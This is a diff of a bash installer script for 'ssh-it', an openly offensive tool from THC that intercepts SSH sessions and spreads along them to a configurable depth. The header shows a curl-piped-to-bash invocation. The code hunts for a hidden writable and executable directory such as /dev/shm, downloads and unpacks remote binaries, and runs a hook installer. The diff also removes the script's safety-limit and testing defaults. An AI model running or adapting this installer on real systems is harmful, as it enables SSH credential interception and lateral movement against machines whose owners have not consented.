@@ -6,7 +6,18 @@
 #
 # This script is typically invoked likes this:
 # 	$ bash -c "$(curl -fsSL thc.org/ssh-it/x)"
-
+#
+# Environment variables:
+#
+# THC_DEPTH=6    - Set depth of when ssh-it shall stop
+#
+# THC_VERBOSE=1  - Enable verbose warning when ssh is intercepted.
+#
+# THC_DEBUG=1    - Enable debug output
+#
+# THC_USELOCAL=1 - Use local binaries (do not use curl/wget to dl static bins)
+#
+# THC_TMPDIR=/tmp/foobar - Use custom temp directory
 
 URL_BASE="https://github.com/hackerschoice/binary/raw/main/ssh-it/"
 URL_DEPLOY="ssh-it.thc.org/x"
@@ -23,16 +34,7 @@ CC="\033[1;36m" # cyan
 CM="\033[1;35m" # magenta
 CN="\033[0m"    # none
 
-# Defaults for 'safety off' (THC_NO_CONDOME)
-_DEFAULT_NOCO_THC_DEPTH=6
-_DEFAULT_NOCO_THC_VERBOSE=
-
-# While in PoC/Alpha phase we use some different defaults for testing & debugging
 _DEFAULT_THC_DEPTH=2
-_DEFAULT_THC_VERBOSE=1
-_DEFAULT_THC_TESTING=1
-# _DEFAULT_THC_TESTING=
-
 
 if [[ -z $THC_DEBUG ]]; then
 	DEBUGF(){ :;}
@@ -42,8 +44,8 @@ fi
 
 clean()
 {
-	DEBUGF "Cleaning '${MY_TMPDIR}'"
-	rm -rf "${MY_TMPDIR:?}" &>/dev/null
+	DEBUGF "Cleaning '${THC_TMPDIR}'"
+	rm -rf "${THC_TMPDIR:?}" &>/dev/null
 }
 
 errexit()
@@ -78,16 +80,42 @@ WARN()
 # 	try_tmpdir "/dev/shm/" 
 try_tmpdir()
 {
-	local dir
-	[[ -z $1 ]] && return
-	[[ -n $MY_TMPDIR ]] && return  # already set
-	[[ ! -d "${1}" ]] && return
+	local dstdir
+	dstdir="${1}"
 
-	dir="${1}.${PKG_NAME}-${UID}"
-	[[ ! -d "${dir}" ]] && mkdir -p "${dir}" 2>/dev/null
-	[[ ! -d "${dir}" ]] && return
+	# Create directory if it does not exists.
+	[[ ! -d "${dstdir}" ]] && { mkdir -p "${dstdir}" &>/dev/null || return 101; }
 
-	MY_TMPDIR="${dir}"
+	THC_TMPDIR="${dstdir}"
+	DSTBIN="${dstdir}/.test-bin"
+	# Return if not writeable
+	touch "$DSTBIN" &>/dev/null || { return 102; }
+
+	# Test if directory is mounted with noexec flag and return success
+	# if binary can be executed from this directory.
+	ebin="/bin/true"
+	if [[ ! -e "$ebin" ]]; then
+		ebin=$(command -v id 2>/dev/null)
+		[[ -z "$ebin" ]] && return 0 # Try our best
+	fi
+	cp -a "$ebin" "$DSTBIN" &>/dev/null || return 0
+	"${DSTBIN}" &>/dev/null || { rm -f "${DSTDBIN}"; return 103; } # FAILURE
+}
+
+try_execdir()
+{
+	if [[ -n "$THC_TMPDIR" ]]; then
+		try_tmpdir "${THC_TMPDIR}" && return
+	else
+		[[ -n "$TMPDIR" ]] && try_tmpdir "${TMPDIR}/.${PKG_NAME}-${UID}" && return
+		try_tmpdir "/tmp/.${PKG_NAME}-${UID}" && return
+		try_tmpdir "${HOME}/.${PKG_NAME}-${UID}" && return
+		try_tmpdir "/dev/shm/.${PKG_NAME}-${UID}" && return
+	fi
+
+	echo -e 1>&2 "${CR}ERROR: Can not find writeable and executable directory.${CN}"
+	WARN "Try setting THC_TMPDIR= to a writeable and executable directory."
+	errexit
 }
 
 init_vars()
@@ -97,19 +125,17 @@ init_vars()
 	local is_set_thc_recheck_time
 	local is_set_thc_testing
 
-	[[ -n THC_VERBOSE ]] && is_set_thc_verbose=1
-	[[ -n THC_DEPTH ]] && is_set_thc_depth=1
-	[[ -n THC_TESTING ]] && is_set_thc_testing=1
-
-	if [[ -n $THC_NO_CONDOME ]]; then
-		# HERE: Remove all safety limits
-		[[ -n $is_set_thc_verbose ]] && THC_VERBOSE="${_DEFAULT_NOCO_THC_VERBOSE}"
-		[[ -n $is_set_thc_depth ]] && THC_DEPTH="${_DEFAULT_NOCO_THC_DEPTH}"
-		[[ -n $is_set_thc_testing ]] && unset THC_TESTING
-	else
-		[[ -n $is_set_thc_depth ]] && THC_DEPTH="${_DEFAULT_THC_DEPTH}"
-		[[ -n $is_set_thc_testing ]] && THC_TESTING="${_DEFAULT_THC_TESTING}"
+	if [[ -z "$HOME" ]]; then
+		HOME="$(grep ^"$(whoami)" /etc/passwd | cut -d: -f6)"
+		[[ ! -d "$HOME" ]] && errexit "ERROR: \$HOME not set. Try 'export HOME=<users home directory>'"
+		WARN "HOME not set. Using '$HOME'"
 	fi
+	
+	# Docker does not set USER
+	[[ -z "$USER" ]] && USER=$(id -un)
+	[[ -z "$UID" ]] && UID=$(id -u)
+
+	[[ -z $THC_DEPTH ]] && THC_DEPTH="${_DEFAULT_THC_DEPTH}"
 
 	[[ -n $THC_NO_VERBOSE ]] && unset THC_VERBOSE
 
@@ -119,13 +145,10 @@ init_vars()
 		:
 	fi
 
-	try_tmpdir "${TMPDIR}"
-	try_tmpdir "/tmp/"
-	try_tmpdir "${HOME}/"
-	try_tmpdir "/dev/shm/"
+	try_execdir
 
-	rm -f "${MY_TMPDIR}/${PKG_NAME}" 2>/dev/null
-	rm -f "${MY_TMPDIR}/${PKG_TGZ}" 2>/dev/null
+	rm -f "${THC_TMPDIR}/${PKG_NAME}" 2>/dev/null
+	rm -f "${THC_TMPDIR}/${PKG_TGZ}" 2>/dev/null
 
 	command -v tar >/dev/null || errexit "Need tar. Try ${CM}apt install tar${CN}"
 	rm -rf "${PKG_DIR:-/dev/null}" 2>/dev/null
@@ -137,7 +160,7 @@ init_vars()
 	DEBUGF "THC_DEPTH      = ${THC_DEPTH}"
 	DEBUGF "THC_DEBUG      = ${THC_DEBUG}"
 	DEBUGF "THC_USELOCAL   = ${THC_USELOCAL}"
-	DEBUGF "MY_TMPDIR      = ${MY_TMPDIR}"
+	DEBUGF "THC_TMPDIR     = ${THC_TMPDIR}"
 }
 
 ask_nocertcheck()
@@ -222,20 +245,20 @@ dl()
 init_vars
 
 echo -en 2>&1 "Downloading binaries.................................................."
-dl "${PKG_TGZ}" "${MY_TMPDIR}/${PKG_TGZ}"
+dl "${PKG_TGZ}" "${THC_TMPDIR}/${PKG_TGZ}"
 OK_OUT
 
 echo -en 2>&1 "Unpacking binaries...................................................."
 # Unpack (suppress "tar: warning: skipping header 'x'" on alpine linux
-(cd "${MY_TMPDIR}" && tar xfz "${PKG_TGZ}" 2>/dev/null) || { FAIL_OUT "unpacking failed"; errexit; }
-[[ ! -f "${MY_TMPDIR}/${PKG_NAME}/hook.sh" ]] && { FAIL_OUT "unpacking failed"; errexit; }
+(cd "${THC_TMPDIR}" && tar xfz "${PKG_TGZ}" 2>/dev/null) || { FAIL_OUT "unpacking failed"; errexit; }
+[[ ! -f "${THC_TMPDIR}/${PKG_NAME}/hook.sh" ]] && { FAIL_OUT "unpacking failed"; errexit; }
 OK_OUT
 
 export THC_DEBUG
 export THC_VERBOSE
 export THC_TESTING
 export THC_DEPTH
-(cd "${MY_TMPDIR}/${PKG_NAME}" && "./hook.sh" install) || errexit;
+(cd "${THC_TMPDIR}/${PKG_NAME}" && "./hook.sh" install) || errexit;
 
 clean
 exit
